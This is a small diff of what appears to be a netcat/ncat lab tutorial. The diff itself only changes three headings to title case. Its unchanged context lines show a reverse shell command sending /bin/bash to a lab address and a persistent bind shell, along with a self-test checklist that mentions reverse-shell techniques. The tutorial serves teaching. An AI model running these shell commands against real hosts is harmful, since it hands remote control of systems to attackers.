@@ -179,7 +179,7 @@ ncat --ssl -e /bin/bash 10.0.0.5 4444
 ncat -k -lvnp 4444 -e /bin/bash
 ```
 
-## Common mistakes & tips
+## Common Mistakes & Tips
 
 - **Listener flags order.** `-l` must not be combined wrongly with `-p` on some builds;
   the widely compatible form is `nc -lvnp PORT`. If a build rejects it, try
@@ -198,7 +198,7 @@ ncat -k -lvnp 4444 -e /bin/bash
 - **Testing against non-lab hosts.** Only run shells/file-transfer drills inside your own
   virtual network.
 
-## Checklist / Self-test
+## Checklist / Self-Test
 
 - [ ] I can connect to a service and grab its banner with `nc`/`ncat`.
 - [ ] I can set up a listener (`nc -lvnp PORT`) and explain each flag.
@@ -209,7 +209,7 @@ ncat -k -lvnp 4444 -e /bin/bash
 - [ ] I can use `ncat --ssl` and `ncat -k` and explain when to use them.
 - [ ] I know at least one `-e`-free reverse-shell technique.
 
-## Further resources
+## Further Resources
 
 - Ncat manual (Nmap project): <https://nmap.org/book/ncat-man.html>
 - Ncat overview page: <https://nmap.org/ncat/>
